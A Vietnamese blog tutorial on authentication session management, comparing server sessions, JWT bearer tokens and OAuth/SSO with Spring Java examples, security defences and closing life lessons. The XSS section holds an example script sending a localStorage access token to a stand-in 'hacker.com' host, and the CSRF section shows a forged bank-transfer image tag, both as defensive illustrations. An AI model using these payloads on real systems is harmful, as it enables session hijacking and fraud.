---
title: "🔐 Quản lý Phiên Xác thực (Auth Session)"
description: "Khám phá các phương pháp quản lý phiên xác thực trong phát triển ứng dụng."
date: "24-10-2025"
tags: ["Phúc Nhân", "Security", "Software Development", "Engineering"]
author: "Phúc Nhân"
slug: "auth-session"
---

# 🔐Quản lý Phiên Xác thực (Auth Session) trong Phát triển Ứng dụng

## 📚 Giới thiệu

Authentication (xác thực) là nền tảng của bất kỳ ứng dụng web nào. Bạn có thể tưởng tượng nó như cái cổng vào nhà - bạn cần chìa khóa đúng để vào, và một khi đã vào, bạn cần cách để nhà biết bạn đang ở đâu trong nhà. Đó chính là session management!

Việc duy trì trạng thái đăng nhập là yêu cầu căn bản của hầu hết ứng dụng web. Có hai cách chính: session-based (dựa trên phiên trên server) và token-based (dựa trên mã thông báo mang theo). Ngoài ra, khi dùng xác thực bên thứ ba như Google/GitHub hay SSO (ví dụ OIDC/SAML), luồng xử lý sẽ đi theo chuẩn OAuth2/OpenID Connect. Ở đây ta sẽ phân tích cả hai phương pháp, và các biện pháp bảo mật (mã hóa token, chống token bị đánh cắp…). Cuối cùng so sánh ưu – nhược điểm của mỗi loại.

## 🍪 Session-Based Authentication

Trong mô hình session-based, server lưu trữ thông tin session của người dùng. Khi người dùng đăng nhập thành công, server tạo một session ID duy nhất và lưu vào bộ nhớ/CSDL của server. Server gửi session ID này về client qua cookie (phần HTTP header Set-Cookie). Trình duyệt sẽ tự động gửi cookie này trong mỗi yêu cầu kế tiếp để server nhận diện người dùng. Các bước điển hình của luồng xác thực session như sau:
1.	Người dùng nhập thông tin đăng nhập rồi gửi (POST) lên server.
2.	Server kiểm tra thông tin, nếu đúng thì tạo một phiên (session) kèm session ID duy nhất và lưu vào cơ sở dữ liệu hoặc bộ nhớ.
3.	Server trả về client cookie chứa session ID (cờ Set-Cookie).
4.	Trình duyệt lưu cookie, và từ đây sẽ gửi cookie này kèm mỗi yêu cầu đến server.
5.	Với mỗi yêu cầu đến, server tra session ID từ cookie để xác định và phục vụ dữ liệu cho đúng người dùng.
6.	Khi người dùng đăng xuất, server hủy phiên và trình duyệt xóa cookie tương ứng.

Ví dụ Java:

```java
@RestController
@RequestMapping("/api/auth")
public class SessionAuthController {
    
    @Autowired
    private UserService userService;
    
    @Autowired
    private HttpSession httpSession;
    
    // Login endpoint
    @PostMapping("/login")
    public ResponseEntity<?> login(@RequestBody LoginRequest request, 
                                   HttpServletRequest httpRequest) {
        // 1. Xác thực user
        User user = userService.authenticate(request.getUsername(), 
                                            request.getPassword());
        
        if (user == null) {
            return ResponseEntity.status(401)
                .body("Invalid credentials");
        }
        
        // 2. Tạo session
        HttpSession session = httpRequest.getSession(true);
        session.setAttribute("userId", user.getId());
        session.setAttribute("username", user.getUsername());
        session.setAttribute("roles", user.getRoles());
        
        // 3. Set session timeout (30 phút)
        session.setMaxInactiveInterval(30 * 60);
        
        return ResponseEntity.ok(new AuthResponse(user.getUsername(), 
                                                  session.getId()));
    }
    
    // Protected endpoint
    @GetMapping("/profile")
    public ResponseEntity<?> getProfile(HttpServletRequest request) {
        HttpSession session = request.getSession(false);
        
        if (session == null) {
            return ResponseEntity.status(401).body("Not authenticated");
        }
        
        Long userId = (Long) session.getAttribute("userId");
        User user = userService.findById(userId);
        
        return ResponseEntity.ok(user);
    }
    
    // Logout
    @PostMapping("/logout")
    public ResponseEntity<?> logout(HttpServletRequest request) {
        HttpSession session = request.getSession(false);
        if (session != null) {
            session.invalidate();
        }
        return ResponseEntity.ok("Logged out successfully");
    }
}
```

Để scale horizontally, bạn nên dùng Redis thay vì in-memory session:

```java
@Configuration
@EnableRedisHttpSession(maxInactiveIntervalInSeconds = 1800)
public class SessionConfig {
    
    @Bean
    public LettuceConnectionFactory connectionFactory() {
        return new LettuceConnectionFactory();
    }
    
    @Bean
    public CookieSerializer cookieSerializer() {
        DefaultCookieSerializer serializer = new DefaultCookieSerializer();
        serializer.setCookieName("SESSIONID");
        serializer.setCookiePath("/");
        serializer.setDomainNamePattern("^.+?\\.(\\w+\\.[a-z]+)$");
        serializer.setUseHttpOnlyCookie(true); // Bảo mật: không cho JS access
        serializer.setUseSecureCookie(true);   // Chỉ gửi qua HTTPS
        serializer.setSameSite("Strict");       // Chống CSRF
        return serializer;
    }
}
```

Phương pháp session-based hoạt động stateful: server phải giữ trạng thái (session) cho từng người dùng và đối chiếu mỗi lần họ gửi cookie. Ưu điểm của phương án này là bảo mật và kiểm soát chặt chẽ: server có thể ngay lập tức vô hiệu hóa (xóa) session nếu cần (ví dụ khi nghi ngờ tài khoản bị tấn công). Tuy nhiên, nó có nhược điểm dễ thấy về quy mô và bảo mật. Vì cần lưu session trên server, hệ thống sẽ tốn tài nguyên và khó mở rộng (nhiều bộ máy phải chia sẻ session qua CSDL hoặc cache). Session-based cũng dễ bị tấn công CSRF: cookie sẽ tự động gửi với mọi yêu cầu của trang, nên nếu không có biện pháp chống CSRF thì hacker có thể giả mạo yêu cầu của người dùng.

## 🎫 Token-Based Authentication (Bearer Token)

Với token-based authentication, server cấp cho client một mã thông báo (ví dụ JWT) thay vì dựa vào session trên server. Khi người dùng đăng nhập thành công, server sinh ra một token (thường là JWT) có ký số bằng khóa bí mật của server và chứa thông tin người dùng. Sau đó server trả token này về client (qua JSON hoặc cookie). Client lưu token (trong LocalStorage, SessionStorage hoặc bộ nhớ ứng dụng), rồi đính kèm token vào mỗi yêu cầu bằng header (ví dụ Authorization: Bearer <token>). Server khi nhận yêu cầu chỉ cần kiểm tra chữ ký (signature) của token mà không cần tra cứu session trên server. Luồng mẫu như sau:
1.	Người dùng gửi thông tin đăng nhập (POST) lên server.
2.	Server xác thực, tạo một JWT bearer token chứa ID người dùng và các quyền, sau đó ký số bằng khoá bí mật.
3.	Server gửi token về client (ví dụ trong phần body JSON).
4.	Client lưu token (vd. trong localStorage trên trình duyệt).
5.	Mỗi khi gọi API bảo vệ, client gắn token vào header Authorization của HTTP: Bearer <token>.
6.	Server nhận, kiểm tra chữ ký token và ngày hết hạn (không cần tra cơ sở dữ liệu!). Nếu hợp lệ thì xử lý yêu cầu.
7.	Đăng xuất đơn giản bằng cách xóa token ở phía client.

### Cấu trúc JWT

JWT gồm 3 phần: `Header.Payload.Signature`

**Ví dụ JWT:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VySWQiOiIxMjM0NSIsInVzZXJuYW1lIjoiZHVjMTIzIiwicm9sZXMiOlsiVVNFUiJdLCJpYXQiOjE3MDAwMDAwMDAsImV4cCI6MTcwMDAwMzYwMH0.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

Header: Thuật toán mã hóa (HS256, RS256...)
Payload: Dữ liệu user (userId, roles, exp...)
Signature: Chữ ký để verify token không bị giả mạo

Token-based là stateless: server không giữ trạng thái người dùng cho mỗi token, chỉ cần dùng khóa để xác minh chữ ký. Điều này giúp hệ thống dễ dàng mở rộng (như microservices có thể tự xác thực token mà không phải gọi trung tâm). Token (đặc biệt JWT) phổ biến trong SPA và ứng dụng di động vì trải nghiệm mượt, không phụ thuộc vào cookie và server session.

### Ví dụ Java tạo JWT

Một thư viện phổ biến là JJWT. 

```xml
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-api</artifactId>
    <version>0.11.5</version>
</dependency>
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-impl</artifactId>
    <version>0.11.5</version>
</dependency>
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-jackson</artifactId>
    <version>0.11.5</version>
</dependency>
```

Ví dụ, để tạo token có mã hóa HS256:

```java
String token = Jwts.builder()
    .setSubject(username)                // Subject có thể là username hoặc userId
    .setIssuedAt(new Date())             // thời điểm tạo
    .setExpiration(new Date(System.currentTimeMillis() + 3600000)) // 1h hết hạn
    .signWith(Keys.hmacShaKeyFor(secretKeyBytes), SignatureAlgorithm.HS256)
    .compact();
```
Trong đó secretKeyBytes là mảng byte khóa bí mật (được mã hóa Base64). Việc ký số (signWith) đảm bảo tính toàn vẹn của token. Client chỉ nhận được token chuỗi đã ký, không biết secretKey.

### Lưu ý bảo mật

Theo mặc định, JWT chỉ được ký số (JSON Web Signature, JWS) nên nội dung token có thể bị đọc nếu lọt vào tay kẻ xấu. Nếu cần mã hóa token thêm, có thể dùng JSON Web Encryption (JWE) để giữ bí mật payload. Ví dụ, JWE mã hóa thông tin token để chỉ server mới giải mã được. Ngoài ra, cách lưu token ở client cũng quan trọng: lưu trong HttpOnly cookie sẽ tránh bị XSS đọc trộm, nhưng lại có nguy cơ CSRF; lưu trong LocalStorage bị XSS, nhưng cần chống CSRF bằng token CSRF hoặc chính sách SameSite. Một giải pháp phổ biến là lưu access token trong bộ nhớ (memory) của ứng dụng và chỉ lưu refresh token trong cookie HttpOnly/Secure/SameSite để gia hạn.
Nếu hacker đánh cắp token (ví dụ qua XSS), có thể cân nhắc các biện pháp: dùng token có thời gian sống ngắn, và yêu cầu refresh token để cấp lại. Server có thể lưu danh sách token bị thu hồi để kiểm tra ở lần refresh. Như một câu trả lời trên StackOverflow chỉ ra: nếu access token bị xâm phạm thì rất khó thu hồi; nhưng refresh token ít dùng hơn và có thể kiểm tra tính hợp lệ (có trong cơ sở dữ liệu hay đã bị vô hiệu hóa). Tóm lại, nên dùng access token ngắn hạn và refresh token dài hạn với cơ chế quay vòng để bảo vệ.

## 🔗 Các Tình huống SSO / OAuth bên thứ ba
Bạn chắc đã thấy nút "Login with Google" hoặc "Login with GitHub" rất nhiều lần. Đây là OAuth 2.0 - cách để ủy quyền đăng nhập cho bên thứ ba.

Khi dùng xác thực bên thứ ba như Google, GitHub hoặc SSO doanh nghiệp (qua SAML/OIDC), luồng xác thực sẽ theo chuẩn OAuth2/OpenID Connect. Ví dụ, với Google/GitHub OAuth2: ứng dụng sẽ chuyển hướng (redirect) người dùng đến trang login của Google/GitHub; người dùng đăng nhập ở đó và cấp quyền cho app; Google trả về authorization code, app dùng code này đổi lấy access token và/hoặc ID token (là JWT chứa thông tin người dùng) từ Google. Sau đó, bạn có thể sử dụng ID token của Google trực tiếp làm token của mình, hoặc tạo mới một session/token riêng cho ứng dụng. Spring Boot hỗ trợ sẵn việc này – ví dụ chỉ cần cấu hình spring.security.oauth2.client.provider.google.client-id và secret, Spring Security sẽ xử lý luồng OAuth2 mặc định.

Với SSO (Single Sign-On) chung, người dùng chỉ cần đăng nhập một lần với nhà cung cấp danh tính (IdP) rồi được truy cập nhiều ứng dụng mà không phải đăng nhập lại. Okta mô tả SSO là một hệ thống trên nền id cung cấp chung (federated identity), nơi một token chứng minh danh tính của người dùng được lưu ở máy chủ SSO (CAS) và được kiểm tra mỗi khi vào ứng dụng khác. Ví dụ, khi dùng OpenID Connect, Google hoặc Facebook có thể trở thành IdP; sau khi login, Google phát ra ID token (JWT) chứa thông tin (email, tên, hình ảnh…) mà ứng dụng có thể dùng để tạo session/token riêng. Phương pháp này cho phép người dùng “login với Google/Github” thay vì mật khẩu của ứng dụng.

Tóm lại, dùng Google/Github/SSO cũng dẫn đến hai lựa chọn cuối: hoặc xây model session (lưu tại server) hoặc token (lưu tại client) cho ứng dụng của bạn. Về cơ bản cơ chế vẫn giống trên, chỉ khác là bước đầu thay vì kiểm tra mật khẩu tự quản thì bạn ủy quyền việc đó cho nhà cung cấp bên ngoài. Nhờ vậy, bạn có thể tận dụng bảo mật của Google/GitHub và giảm gánh nặng tự quản lý mật khẩu.

## 🛡️ Bảo Mật: Ngăn Chặn Các Mối Đe Dọa

### XSS (Cross-Site Scripting)

XSS là lỗ hổng cho phép kẻ tấn công chèn mã JavaScript độc hại vào trang web, từ đó đánh cắp token hoặc cookie. Để phòng chống XSS:
- Luôn sanitize và escape dữ liệu đầu vào từ người dùng.
- Sử dụng Content Security Policy (CSP) để hạn chế nguồn tải script.
- Lưu token trong HttpOnly cookie để JavaScript không thể truy cập.

**Ví dụ tấn công**: Hacker inject JavaScript vào website để đánh cắp token từ localStorage.

```js
// Hacker inject script này vào comment, form...
<script>
  fetch('https://hacker.com/steal', {
    method: 'POST',
    body: localStorage.getItem('accessToken')
  });
</script>
```

**Phòng chống**:

**Option 1**: Lưu token trong HttpOnly Cookie (không thể access bằng JS)

```java
@Bean
public CookieSerializer cookieSerializer() {
    DefaultCookieSerializer serializer = new DefaultCookieSerializer();
    serializer.setUseHttpOnlyCookie(true); // ✅ Chống XSS
    serializer.setUseSecureCookie(true);    // Chỉ HTTPS
    serializer.setSameSite("Strict");        // Chống CSRF
    return serializer;
}
```

**Option 2**: Sanitize user input

```java
@PostMapping("/comment")
public ResponseEntity<?> createComment(@RequestBody CommentRequest request) {
    String cleanContent = Jsoup.clean(request.getContent(), Whitelist.basic());
    // Lưu cleanContent thay vì request.getContent()
}
```

**Option 3**: Content Security Policy header
```java
@Bean
public FilterRegistrationBean<ContentSecurityPolicyFilter> cspFilter() {
    FilterRegistrationBean<ContentSecurityPolicyFilter> registrationBean = 
        new FilterRegistrationBean<>();
    registrationBean.setFilter(new ContentSecurityPolicyFilter());
    return registrationBean;
}

public class ContentSecurityPolicyFilter implements Filter {
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, 
                        FilterChain chain) throws IOException, ServletException {
        HttpServletResponse httpResponse = (HttpServletResponse) response;
        httpResponse.setHeader("Content-Security-Policy", 
            "default-src 'self'; script-src 'self'");
        chain.doFilter(request, response);
    }
}
```

### CSRF (Cross-Site Request Forgery)
CSRF là tấn công lừa người dùng đã đăng nhập thực hiện các hành động không mong muốn trên trang web. Để ngăn chặn CSRF:
- Sử dụng token CSRF: server tạo token duy nhất cho mỗi phiên và yêu cầu client gửi token này trong các yêu cầu thay đổi trạng thái (POST, PUT, DELETE).
- Thiết lập SameSite cookie để hạn chế cookie được gửi từ các trang bên ngoài.
- Xác thực lại người dùng cho các hành động quan trọng (ví dụ nhập lại mật khẩu).

**Ví dụ tấn công**: Hacker lừa user click vào link độc hại, thực hiện actions khi user đang login.

```html
<!-- User đang login vào bank.com, hacker gửi email chứa: -->
<img src="https://bank.com/transfer?to=hacker&amount=10000" />
<!-- Browser tự động gửi cookie của bank.com! -->
```

**Phòng chống**:

- Với session-based, dùng token CSRF, Frontend phải gửi CSRF token mỗi request `Header: X-XSRF-TOKEN: <token_value>`:

```java
@Configuration
public class SecurityConfig extends WebSecurityConfigurerAdapter {
    
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .csrf()
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            .and()
            .authorizeRequests()
                .anyRequest().authenticated();
    }
}
```

- Với token-based, JWT không dễ bị CSRF vì token không tự động gửi như cookie, nhưng vẫn nên verify referer/origin header:

```java
@Component
public class OriginCheckFilter extends OncePerRequestFilter {
    
    private static final List<String> ALLOWED_ORIGINS = Arrays.asList(
        "https://myapp.com",
        "https://www.myapp.com"
    );
    
    @Override
    protected void doFilterInternal(HttpServletRequest request, 
                                   HttpServletResponse response, 
                                   FilterChain chain) throws ServletException, IOException {
        
        String origin = request.getHeader("Origin");
        String referer = request.getHeader("Referer");
        
        if (origin != null && !ALLOWED_ORIGINS.contains(origin)) {
            response.setStatus(HttpServletResponse.SC_FORBIDDEN);
            response.getWriter().write("{\"error\": \"Invalid origin\"}");
            return;
        }
        
        chain.doFilter(request, response);
    }
}
```

### Token Theft (Đánh cắp Token)
Tình huống: Hacker lấy được token của user (qua XSS, man-in-the-middle, hoặc user tự leak).

Phòng chống:
- Dùng HTTPS để mã hóa toàn bộ giao tiếp, tránh MITM.
- Sử dụng token ngắn hạn (access token) và token dài hạn (refresh token) với cơ chế quay vòng.
- Token Binding: gắn token với device/IP để phát hiện bất thường.
- Token Blacklist: lưu danh sách token bị thu hồi để kiểm tra.
- Giám sát hành vi bất thường (ví dụ đăng nhập từ địa chỉ IP lạ).
- Đa yếu tố (MFA) để tăng cường bảo mật.

```java
// 1. Token Binding - Bind token với device/IP
public String generateAccessToken(User user, HttpServletRequest request) {
    String userAgent = request.getHeader("User-Agent");
    String ipAddress = request.getRemoteAddr();
    
    // Hash để không lộ thông tin nhạy cảm
    String deviceFingerprint = DigestUtils.sha256Hex(userAgent + ipAddress);
    
    Map<String, Object> claims = new HashMap<>();
    claims.put("userId", user.getId());
    claims.put("fingerprint", deviceFingerprint);
    
    return Jwts.builder()
        .setClaims(claims)
        .setSubject(user.getUsername())
        .setExpiration(new Date(System.currentTimeMillis() + ACCESS_TOKEN_VALIDITY))
        .signWith(getSigningKey(), SignatureAlgorithm.HS256)
        .compact();
}

// Verify fingerprint mỗi request
public boolean validateTokenWithFingerprint(String token, HttpServletRequest request) {
    Claims claims = validateToken(token);
    
    String userAgent = request.getHeader("User-Agent");
    String ipAddress = request.getRemoteAddr();
    String currentFingerprint = DigestUtils.sha256Hex(userAgent + ipAddress);
    
    String tokenFingerprint = claims.get("fingerprint", String.class);
    
    if (!currentFingerprint.equals(tokenFingerprint)) {
        throw new AuthException("Token được sử dụng từ device khác!");
    }
    
    return true;
}

// 2. Token Rotation - Đổi token sau mỗi lần dùng
@PostMapping("/refresh")
public ResponseEntity<?> refreshToken(@RequestBody RefreshRequest request) {
    String oldRefreshToken = request.getRefreshToken();
    
    // Validate old token
    Claims claims = jwtUtil.validateToken(oldRefreshToken);
    String username = claims.getSubject();
    
    // Check token chưa bị revoke
    if (!refreshTokenService.isValidRefreshToken(oldRefreshToken)) {
        // ⚠️ Có thể token bị đánh cắp! Revoke tất cả tokens của user
        refreshTokenService.revokeAllTokens(username);
        throw new AuthException("Phát hiện token bất thường. Vui lòng đăng nhập lại.");
    }
    
    // Generate new tokens
    User user = userService.findByUsername(username);
    String newAccessToken = jwtUtil.generateAccessToken(user);
    String newRefreshToken = jwtUtil.generateRefreshToken(user);
    
    // Revoke old refresh token
    refreshTokenService.revokeRefreshToken(oldRefreshToken);
    
    // Save new refresh token
    refreshTokenService.saveRefreshToken(user.getId(), newRefreshToken);
    
    return ResponseEntity.ok(new TokenResponse(newAccessToken, newRefreshToken));
}

// 3. Token Blacklist - Cho phép revoke ngay lập tức
@Service
public class TokenBlacklistService {
    
    @Autowired
    private RedisTemplate<String, String> redisTemplate;
    
    public void blacklistToken(String token) {
        Claims claims = jwtUtil.validateToken(token);
        Date expiration = claims.getExpiration();
        
        long ttl = expiration.getTime() - System.currentTimeMillis();
        
        if (ttl > 0) {
            redisTemplate.opsForValue()
                .set("blacklist:" + token, "revoked", ttl, TimeUnit.MILLISECONDS);
        }
    }
    
    public boolean isBlacklisted(String token) {
        return redisTemplate.hasKey("blacklist:" + token);
    }
}

// Check blacklist trong filter
@Component
public class JwtAuthenticationFilter extends OncePerRequestFilter {
    
    @Autowired
    private TokenBlacklistService blacklistService;
    
    @Override
    protected void doFilterInternal(HttpServletRequest request, 
                                   HttpServletResponse response, 
                                   FilterChain filterChain) throws ServletException, IOException {
        
        String token = extractToken(request);
        
        if (token != null && blacklistService.isBlacklisted(token)) {
            response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
            response.getWriter().write("{\"error\": \"Token đã bị revoke\"}");
            return;
        }
        
        // Continue validation...
    }
}
```

### Brute Force Attack

Tấn công dò mật khẩu để chiếm đoạt tài khoản người dùng. Hacker thử hàng ngàn mật khẩu để đăng nhập.

Phòng chống:
- Giới hạn số lần đăng nhập thất bại (rate limiting).
- Dùng CAPTCHA sau một số lần thất bại.
- Khóa tài khoản tạm thời sau nhiều lần đăng nhập sai.
- Sử dụng đa yếu tố (MFA) để tăng cường bảo mật.

### Man-in-the-Middle (MITM)

Tấn công trung gian, hacker chặn traffic giữa client và server để đánh cắp token.

Phòng chống:
- Luôn sử dụng HTTPS để mã hóa toàn bộ giao tiếp.
- HSTS (HTTP Strict Transport Security) ngăn không cho user vô tình truy cập HTTP.
- Certificate Pinning chống hacker giả mạo server.

## ⚖️ So Sánh Chi Tiết: Session vs Token vs OAuth

### Bảng So Sánh

| Tiêu chí | Session-Based | Token-Based (JWT) | Third-Party OAuth |
|---------|---------------|-------------------|-------------------|
| **Scalability** | ⭐⭐ (Cần Redis/DB shared) | ⭐⭐⭐⭐⭐ (Stateless, dễ scale) | ⭐⭐⭐⭐ (Stateless, nhưng phụ thuộc provider) |
| **Security** | ⭐⭐⭐⭐ (Dễ revoke, HttpOnly cookie) | ⭐⭐⭐ (Khó revoke, XSS risk nếu dùng localStorage) | ⭐⭐⭐⭐ (Provider bảo mật tốt, nhưng thêm attack surface) |
| **Performance** | ⭐⭐⭐ (Query DB mỗi request) | ⭐⭐⭐⭐⭐ (Không query DB) | ⭐⭐⭐ (Phải call provider API) |
| **Mobile-Friendly** | ⭐⭐ (Cookie không tự nhiên trên mobile) | ⭐⭐⭐⭐⭐ (Perfect cho mobile) | ⭐⭐⭐⭐ (Tốt, nhưng phức tạp hơn) |
| **Implementation** | ⭐⭐⭐⭐⭐ (Dễ nhất, built-in) | ⭐⭐⭐ (Cần implement JWT logic) | ⭐⭐ (Phức tạp nhất, nhiều steps) |
| **UX** | ⭐⭐⭐⭐ (Transparent cho user) | ⭐⭐⭐⭐ (Transparent) | ⭐⭐⭐⭐⭐ (Tốt nhất - 1 click login) |
| **Control** | ⭐⭐⭐⭐⭐ (Full control) | ⭐⭐⭐⭐ (Control, nhưng khó revoke) | ⭐⭐⭐ (Phụ thuộc provider) |
| **CORS Handling** | ⭐⭐ (Cookie CORS phức tạp) | ⭐⭐⭐⭐⭐ (Dễ handle CORS) | ⭐⭐⭐⭐ (Tốt) |
| **Microservices** | ⭐⭐ (Cần session replication) | ⭐⭐⭐⭐⭐ (Perfect cho microservices) | ⭐⭐⭐⭐ (Tốt) |

### Khi nào dùng gì?

#### 🍪 Session-Based - Dùng khi:
- **Traditional web app** (server-side rendering, monolith)
- **High security requirements** (banking, government)
- **Cần revoke ngay lập tức** (admin dashboards)
- **Team nhỏ, không cần scale quá lớn**

**Example Use Cases:**
- Admin panel nội bộ công ty
- Banking web app
- CMS (WordPress, Drupal...)

```java
// Ví dụ: Admin panel - cần revoke ngay khi phát hiện suspicious activity
@PostMapping("/admin/users/{userId}/revoke-session")
public ResponseEntity<?> revokeUserSession(@PathVariable Long userId) {
    sessionService.invalidateAllSessionsForUser(userId);
    return ResponseEntity.ok("All sessions revoked immediately");
}
```

#### 🎫 Token-Based (JWT) - Dùng khi:
- **Mobile apps** (iOS, Android)
- **SPA** (React, Vue, Angular...)
- **Microservices architecture**
- **RESTful API** cho third-party
- **Need to scale horizontally**

**Example Use Cases:**
- Mobile banking app
- E-commerce API
- SaaS platform
- IoT devices authentication

```java
// Ví dụ: Mobile app - token trong memory, không cần cookie
POST /api/auth/login
Response: {
  "accessToken": "eyJhbGc...",
  "refreshToken": "eyJhbGc...",
  "expiresIn": 900
}

// Mobile app lưu token và gửi mỗi request
GET /api/products
Header: Authorization: Bearer eyJhbGc...
```

#### 🌐 OAuth/SSO - Dùng khi:
- **B2C apps** muốn giảm friction (user không thích tạo account mới)
- **Enterprise apps** cần integrate với corporate identity provider
- **Muốn có social features** (share, invite friends...)
- **Không muốn handle password security**

**Example Use Cases:**
- Social media apps (Instagram, Twitter clone...)
- Developer tools (CodePen, Replit...)
- Enterprise collaboration tools (Slack, Notion...)
- E-learning platforms

```java
// Ví dụ: Developer platform - dễ onboard developers
"Login with GitHub" 
→ Tự động lấy username, avatar, repos
→ User vào được ngay, không phải điền form
```

### Hybrid Approach (Recommended)

Thực tế, nhiều apps dùng **kết hợp cả 3**:

```java
@RestController
@RequestMapping("/api/auth")
public class HybridAuthController {
    
    // Option 1: Email/Password login → JWT
    @PostMapping("/login")
    public ResponseEntity<?> login(@RequestBody LoginRequest request) {
        User user = userService.authenticate(request.getUsername(), request.getPassword());
        String accessToken = jwtUtil.generateAccessToken(user);
        String refreshToken = jwtUtil.generateRefreshToken(user);
        return ResponseEntity.ok(new TokenResponse(accessToken, refreshToken));
    }
    
    // Option 2: OAuth login → JWT
    @GetMapping("/oauth/{provider}")
    public ResponseEntity<?> oauthLogin(@PathVariable String provider) {
        // Redirect to Google/GitHub...
    }
    
    // Option 3: Session-based for admin panel
    @PostMapping("/admin/login")
    public ResponseEntity<?> adminLogin(@RequestBody LoginRequest request, 
                                       HttpServletRequest httpRequest) {
        User user = userService.authenticateAdmin(request.getUsername(), request.getPassword());
        HttpSession session = httpRequest.getSession(true);
        session.setAttribute("adminUserId", user.getId());
        return ResponseEntity.ok("Admin logged in");
    }
}
```

**Architecture:**
```
Frontend Apps:
- Web (React) → JWT
- Mobile (iOS/Android) → JWT  
- Admin Panel (Server-side) → Session

Auth Options:
- Email/Password → JWT
- Google OAuth → JWT (sau khi verify với Google)
- GitHub OAuth → JWT (sau khi verify với GitHub)
- SSO (Enterprise) → Session (cho admin panel)

Backend:
- Public API → JWT authentication
- Admin API → Session authentication
- Microservices → JWT (share public key để verify)
```

---

## 🎓 Kết Luận & Bài Học Cuộc Sống

### 1. **Không có giải pháp hoàn hảo (No Silver Bullet)**

Giống như authentication, cuộc sống không có công thức nào hoàn hảo cho mọi tình huống:
- Session tốt cho A, nhưng không tốt cho B
- JWT giải quyết vấn đề này, nhưng tạo ra vấn đề khác
- OAuth tiện lợi, nhưng phụ thuộc người khác

Đừng tìm "giải pháp tốt nhất", hãy tìm "giải pháp phù hợp nhất" với hoàn cảnh của bạn.

### 2. **Defense in Depth (Phòng thủ nhiều lớp)**

Chúng ta không chỉ dùng 1 biện pháp bảo mật:
- HTTPS + HttpOnly Cookie + CSRF Token + Rate Limiting + MFA

Trong cuộc sống, đừng dựa vào 1 "kế hoạch dự phòng" duy nhất. Có plan B, C, D.
- Đừng chỉ có 1 nguồn thu nhập
- Đừng chỉ có 1 kỹ năng
- Đừng chỉ tin vào 1 người

### 3. **Trade-offs (Đánh đổi)**

Mỗi quyết định đều có trade-off:
- Session → Dễ implement nhưng khó scale
- JWT → Scale tốt nhưng khó revoke
- OAuth → UX tốt nhưng phụ thuộc bên thứ ba

Mọi quyết định trong đời đều có giá của nó. Không có "free lunch":
- Làm việc nhiều → Thu nhập cao nhưng ít thời gian gia đình
- Khởi nghiệp → Tự do nhưng rủi ro cao
- Nhảy việc → Lương cao nhưng phải adapt lại từ đầu

Hãy **biết rõ bạn đang đánh đổi cái gì**, và chấp nhận nó một cách tỉnh táo.

### 4. **Simplicity is Sophistication (Đơn giản là tinh tế)**

Code bảo mật tốt nhất không phải là code phức tạp nhất:
- Session-based đơn giản nhưng đủ tốt cho 80% use cases
- Đừng over-engineer nếu không cần

**Lesson**: Đừng làm cuộc sống phức tạp hơn cần thiết:
- Đừng mua nhà quá lớn nếu chỉ sống 1-2 người
- Đừng vay nợ quá nhiều để "đầu tư"
- Đừng tham gia quá nhiều hoạt động mà không kham nổi

"Perfection is achieved, not when there is nothing more to add, but when there is nothing left to take away." - Antoine de Saint-Exupéry

#### 5. **Trust, But Verify (Tin tưởng, nhưng phải kiểm chứng)**

OAuth: Tin Google/GitHub, nhưng vẫn phải verify token
JWT: Tin client gửi token, nhưng vẫn phải verify signature

Trong cuộc sống, công việc:
- Tin tưởng đồng nghiệp, nhưng vẫn review code
- Tin tưởng nhà thầu, nhưng vẫn kiểm tra tiến độ
- Tin tưởng bản thân, nhưng vẫn cần feedback từ người khác

---

Tài liệu Tham khảo

[Session-Based vs. Token-Based User Authentication](https://www.criipto.com/blog/session-token-based-authentication)

[Session vs Token Based Authentication - GeeksforGeeks](https://www.geeksforgeeks.org/computer-networks/session-vs-token-based-authentication/)

[Managing user sessions: localStorage vs sessionStorage vs cookies](https://stytch.com/blog/localstorage-vs-sessionstorage-vs-cookies/)

[Creating a Spring Security Key for Signing a JWT Token | Baeldung](https://www.baeldung.com/spring-security-sign-jwt-token)

[The ABCs of token security: JWS, JWE, JWK, and JWKS explained — WorkOS](https://workos.com/blog/jws-jwe-jwk-jwks-explained)

[Why Use Refresh Tokens in Authentication? Can't They Be Stolen Like JWTs? - Stack Overflow](https://stackoverflow.com/questions/79195638/why-use-refresh-tokens-in-authentication-cant-they-be-stolen-like-jwts)

[Getting Started | Spring Boot and OAuth2](https://spring.io/guides/tutorials/spring-boot-oauth2/)

[What is Single Sign-On and How SSO Works | Okta](https://www.okta.com/blog/identity-security/single-sign-on-sso/)

